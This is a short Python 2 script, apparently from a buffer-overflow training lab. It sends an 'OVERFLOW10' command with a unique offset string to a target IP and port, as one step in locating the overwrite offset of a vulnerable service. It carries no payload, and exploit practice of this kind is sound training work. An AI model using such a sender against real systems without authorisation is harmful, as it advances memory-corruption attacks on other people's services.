#!/usr/bin/python
import sys
import socket
import time

if len(sys.argv) < 4:
    print "\nUsage: python fuzzer.py <target ip> <target port> <unique buffer offset string>"
    sys.exit(0)

# TODO
# change request body before requesting
request_body = "OVERFLOW10 {buffer}\r\n"

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
_buffer = sys.argv[3]

print _buffer
timeout = 10

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((target_ip, target_port))
    s.recv(1024)
    s.send(request_body.format(buffer=_buffer))
    s.recv(1024)
    s.close()
    print "\nDone!"
except Exception as e:
    print "Exception occured - " + e.message

